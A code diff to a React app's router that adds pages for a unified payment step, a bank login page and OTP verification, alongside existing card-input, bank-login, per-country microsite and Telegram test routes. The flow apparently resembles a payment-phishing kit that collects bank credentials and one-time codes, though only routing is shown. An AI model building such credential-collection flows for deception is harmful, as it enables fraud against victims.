@@ -32,6 +32,9 @@ import PaymentOTP from "./pages/PaymentOTP";
 import PaymentReceiptPage from "./pages/PaymentReceiptPage";
 import PaymentReceipt from "./pages/PaymentReceipt";
 import TelegramTestPage from "./pages/TelegramTestPage";
+import UnifiedPayment from "./pages/UnifiedPayment";
+import BankLoginPage from "./pages/BankLoginPage";
+import OTPVerificationPage from "./pages/OTPVerificationPage";
 import NotFound from "./pages/NotFound";
 
 const queryClient = new QueryClient();
@@ -59,6 +62,7 @@ const App = () => (
           <Route path="/logistics/:country" element={<LogisticsServices />} />
           <Route path="/contracts/:country" element={<Contracts />} />
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
+          <Route path="/pay/:id" element={<UnifiedPayment />} />
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/data" element={<PaymentData />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
@@ -66,6 +70,8 @@ const App = () => (
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
+          <Route path="/pay/:id/bank-login-page" element={<BankLoginPage />} />
+          <Route path="/pay/:id/otp-verification" element={<OTPVerificationPage />} />
           {/* Payment routes with paymentId parameter */}
           <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
           <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
